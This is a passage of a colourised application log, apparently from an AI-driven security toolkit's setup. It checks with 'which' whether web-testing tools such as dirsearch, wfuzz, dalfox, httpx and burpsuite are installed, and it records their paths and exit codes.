2025-10-24 06:15:12,229 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dirsearch
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,229 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,229 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,229 - __main__ - INFO - 💾 Cached result for command: which dirsearch
2025-10-24 06:15:12,229 - __main__ - INFO - 🔍 Cache MISS for command: which dotdotpwn
2025-10-24 06:15:12,229 - __main__ - INFO - 🚀 EXECUTING: which dotdotpwn
2025-10-24 06:15:12,229 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,229 - __main__ - INFO - 🆔 PROCESS: PID 3093 started
2025-10-24 06:15:12,229 - __main__ - INFO - 🆔 REGISTERED: Process 3093 - which dotdotpwn...
2025-10-24 06:15:12,230 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3093
2025-10-24 06:15:12,232 - __main__ - INFO - 📤 STDOUT: /usr/bin/dotdotpwn
2025-10-24 06:15:12,234 - __main__ - INFO - 🧹 CLEANUP: Process 3093 removed from registry
2025-10-24 06:15:12,234 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,234 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,234 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dotdotpwn
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,234 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,234 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,234 - __main__ - INFO - 💾 Cached result for command: which dotdotpwn
2025-10-24 06:15:12,234 - __main__ - INFO - 🔍 Cache MISS for command: which xsser
2025-10-24 06:15:12,234 - __main__ - INFO - 🚀 EXECUTING: which xsser
2025-10-24 06:15:12,234 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,235 - __main__ - INFO - 🆔 PROCESS: PID 3098 started
2025-10-24 06:15:12,235 - __main__ - INFO - 🆔 REGISTERED: Process 3098 - which xsser...
2025-10-24 06:15:12,235 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3098
2025-10-24 06:15:12,237 - __main__ - INFO - 📤 STDOUT: /usr/bin/xsser
2025-10-24 06:15:12,239 - __main__ - INFO - 🧹 CLEANUP: Process 3098 removed from registry
2025-10-24 06:15:12,239 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,239 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,239 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which xsser
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,239 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,239 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,239 - __main__ - INFO - 💾 Cached result for command: which xsser
2025-10-24 06:15:12,239 - __main__ - INFO - 🔍 Cache MISS for command: which wfuzz
2025-10-24 06:15:12,239 - __main__ - INFO - 🚀 EXECUTING: which wfuzz
2025-10-24 06:15:12,239 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,240 - __main__ - INFO - 🆔 PROCESS: PID 3103 started
2025-10-24 06:15:12,240 - __main__ - INFO - 🆔 REGISTERED: Process 3103 - which wfuzz...
2025-10-24 06:15:12,240 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3103
2025-10-24 06:15:12,242 - __main__ - INFO - 📤 STDOUT: /usr/bin/wfuzz
2025-10-24 06:15:12,245 - __main__ - INFO - 🧹 CLEANUP: Process 3103 removed from registry
2025-10-24 06:15:12,245 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,245 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,245 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wfuzz
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,245 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,245 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,246 - __main__ - INFO - 💾 Cached result for command: which wfuzz
2025-10-24 06:15:12,246 - __main__ - INFO - 🔍 Cache MISS for command: which gau
2025-10-24 06:15:12,246 - __main__ - INFO - 🚀 EXECUTING: which gau
2025-10-24 06:15:12,246 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,246 - __main__ - INFO - 🆔 PROCESS: PID 3108 started
2025-10-24 06:15:12,246 - __main__ - INFO - 🆔 REGISTERED: Process 3108 - which gau...
2025-10-24 06:15:12,247 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3108
2025-10-24 06:15:12,248 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/gau
2025-10-24 06:15:12,251 - __main__ - INFO - 🧹 CLEANUP: Process 3108 removed from registry
2025-10-24 06:15:12,251 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,251 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,251 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gau
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,251 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,251 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,251 - __main__ - INFO - 💾 Cached result for command: which gau
2025-10-24 06:15:12,251 - __main__ - INFO - 🔍 Cache MISS for command: which waybackurls
2025-10-24 06:15:12,251 - __main__ - INFO - 🚀 EXECUTING: which waybackurls
2025-10-24 06:15:12,251 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,252 - __main__ - INFO - 🆔 PROCESS: PID 3113 started
2025-10-24 06:15:12,252 - __main__ - INFO - 🆔 REGISTERED: Process 3113 - which waybackurls...
2025-10-24 06:15:12,252 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3113
2025-10-24 06:15:12,254 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/waybackurls
2025-10-24 06:15:12,257 - __main__ - INFO - 🧹 CLEANUP: Process 3113 removed from registry
2025-10-24 06:15:12,257 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,257 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,257 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which waybackurls
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 27 bytes
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,257 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,257 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,257 - __main__ - INFO - 💾 Cached result for command: which waybackurls
2025-10-24 06:15:12,257 - __main__ - INFO - 🔍 Cache MISS for command: which arjun
2025-10-24 06:15:12,257 - __main__ - INFO - 🚀 EXECUTING: which arjun
2025-10-24 06:15:12,257 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,257 - __main__ - INFO - 🆔 PROCESS: PID 3118 started
2025-10-24 06:15:12,257 - __main__ - INFO - 🆔 REGISTERED: Process 3118 - which arjun...
2025-10-24 06:15:12,258 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3118
2025-10-24 06:15:12,260 - __main__ - INFO - 📤 STDOUT: /usr/bin/arjun
2025-10-24 06:15:12,264 - __main__ - INFO - 🧹 CLEANUP: Process 3118 removed from registry
2025-10-24 06:15:12,264 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,264 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,264 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which arjun
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,264 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,264 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,264 - __main__ - INFO - 💾 Cached result for command: which arjun
2025-10-24 06:15:12,264 - __main__ - INFO - 🔍 Cache MISS for command: which paramspider
2025-10-24 06:15:12,264 - __main__ - INFO - 🚀 EXECUTING: which paramspider
2025-10-24 06:15:12,264 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,265 - __main__ - INFO - 🆔 PROCESS: PID 3123 started
2025-10-24 06:15:12,265 - __main__ - INFO - 🆔 REGISTERED: Process 3123 - which paramspider...
2025-10-24 06:15:12,266 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3123
2025-10-24 06:15:12,268 - __main__ - INFO - 📤 STDOUT: /usr/bin/paramspider
2025-10-24 06:15:12,270 - __main__ - INFO - 🧹 CLEANUP: Process 3123 removed from registry
2025-10-24 06:15:12,270 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,270 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,270 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which paramspider
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,270 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,270 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,270 - __main__ - INFO - 💾 Cached result for command: which paramspider
2025-10-24 06:15:12,270 - __main__ - INFO - 🔍 Cache MISS for command: which x8
2025-10-24 06:15:12,270 - __main__ - INFO - 🚀 EXECUTING: which x8
2025-10-24 06:15:12,270 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,270 - __main__ - INFO - 🆔 PROCESS: PID 3128 started
2025-10-24 06:15:12,270 - __main__ - INFO - 🆔 REGISTERED: Process 3128 - which x8...
2025-10-24 06:15:12,271 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3128
2025-10-24 06:15:12,273 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/x8
2025-10-24 06:15:12,275 - __main__ - INFO - 🧹 CLEANUP: Process 3128 removed from registry
2025-10-24 06:15:12,275 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,275 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,275 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which x8
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,275 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,275 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,275 - __main__ - INFO - 💾 Cached result for command: which x8
2025-10-24 06:15:12,275 - __main__ - INFO - 🔍 Cache MISS for command: which jaeles
2025-10-24 06:15:12,275 - __main__ - INFO - 🚀 EXECUTING: which jaeles
2025-10-24 06:15:12,275 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,276 - __main__ - INFO - 🆔 PROCESS: PID 3133 started
2025-10-24 06:15:12,276 - __main__ - INFO - 🆔 REGISTERED: Process 3133 - which jaeles...
2025-10-24 06:15:12,277 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3133
2025-10-24 06:15:12,279 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/jaeles
2025-10-24 06:15:12,279 - __main__ - INFO - 🧹 CLEANUP: Process 3133 removed from registry
2025-10-24 06:15:12,279 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,279 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,279 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jaeles
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,279 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,279 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,279 - __main__ - INFO - 💾 Cached result for command: which jaeles
2025-10-24 06:15:12,280 - __main__ - INFO - 🔍 Cache MISS for command: which dalfox
2025-10-24 06:15:12,280 - __main__ - INFO - 🚀 EXECUTING: which dalfox
2025-10-24 06:15:12,280 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,280 - __main__ - INFO - 🆔 PROCESS: PID 3138 started
2025-10-24 06:15:12,280 - __main__ - INFO - 🆔 REGISTERED: Process 3138 - which dalfox...
2025-10-24 06:15:12,281 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3138
2025-10-24 06:15:12,283 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/dalfox
2025-10-24 06:15:12,285 - __main__ - INFO - 🧹 CLEANUP: Process 3138 removed from registry
2025-10-24 06:15:12,285 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,285 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,285 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dalfox
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,285 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,285 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,285 - __main__ - INFO - 💾 Cached result for command: which dalfox
2025-10-24 06:15:12,285 - __main__ - INFO - 🔍 Cache MISS for command: which httpx
2025-10-24 06:15:12,285 - __main__ - INFO - 🚀 EXECUTING: which httpx
2025-10-24 06:15:12,285 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,286 - __main__ - INFO - 🆔 PROCESS: PID 3143 started
2025-10-24 06:15:12,286 - __main__ - INFO - 🆔 REGISTERED: Process 3143 - which httpx...
2025-10-24 06:15:12,286 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3143
2025-10-24 06:15:12,288 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/httpx
2025-10-24 06:15:12,290 - __main__ - INFO - 🧹 CLEANUP: Process 3143 removed from registry
2025-10-24 06:15:12,290 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,290 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,290 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,290 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,291 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which httpx
2025-10-24 06:15:12,291 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,291 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 42 bytes
2025-10-24 06:15:12,291 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,291 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,291 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,291 - __main__ - INFO - 💾 Cached result for command: which httpx
2025-10-24 06:15:12,291 - __main__ - INFO - 🔍 Cache MISS for command: which wafw00f
2025-10-24 06:15:12,291 - __main__ - INFO - 🚀 EXECUTING: which wafw00f
2025-10-24 06:15:12,291 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,291 - __main__ - INFO - 🆔 PROCESS: PID 3148 started
2025-10-24 06:15:12,291 - __main__ - INFO - 🆔 REGISTERED: Process 3148 - which wafw00f...
2025-10-24 06:15:12,292 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3148
2025-10-24 06:15:12,294 - __main__ - INFO - 📤 STDOUT: /usr/bin/wafw00f
2025-10-24 06:15:12,296 - __main__ - INFO - 🧹 CLEANUP: Process 3148 removed from registry
2025-10-24 06:15:12,296 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,296 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,296 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wafw00f
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,296 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,296 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,296 - __main__ - INFO - 💾 Cached result for command: which wafw00f
2025-10-24 06:15:12,296 - __main__ - INFO - 🔍 Cache MISS for command: which burpsuite
2025-10-24 06:15:12,297 - __main__ - INFO - 🚀 EXECUTING: which burpsuite
2025-10-24 06:15:12,297 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,297 - __main__ - INFO - 🆔 PROCESS: PID 3153 started
2025-10-24 06:15:12,297 - __main__ - INFO - 🆔 REGISTERED: Process 3153 - which burpsuite...
2025-10-24 06:15:12,298 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3153
2025-10-24 06:15:12,299 - __main__ - INFO - 📤 STDOUT: /usr/bin/burpsuite
2025-10-24 06:15:12,302 - __main__ - INFO - 🧹 CLEANUP: Process 3153 removed from registry
2025-10-24 06:15:12,302 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,302 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,302 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which burpsuite
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,302 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,302 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,302 - __main__ - INFO - 💾 Cached result for command: which burpsuite
2025-10-24 06:15:12,302 - __main__ - INFO - 🔍 Cache MISS for command: which zaproxy
2025-10-24 06:15:12,302 - __main__ - INFO - 🚀 EXECUTING: which zaproxy
2025-10-24 06:15:12,302 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,302 - __main__ - INFO - 🆔 PROCESS: PID 3158 started
2025-10-24 06:15:12,302 - __main__ - INFO - 🆔 REGISTERED: Process 3158 - which zaproxy...
2025-10-24 06:15:12,303 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3158
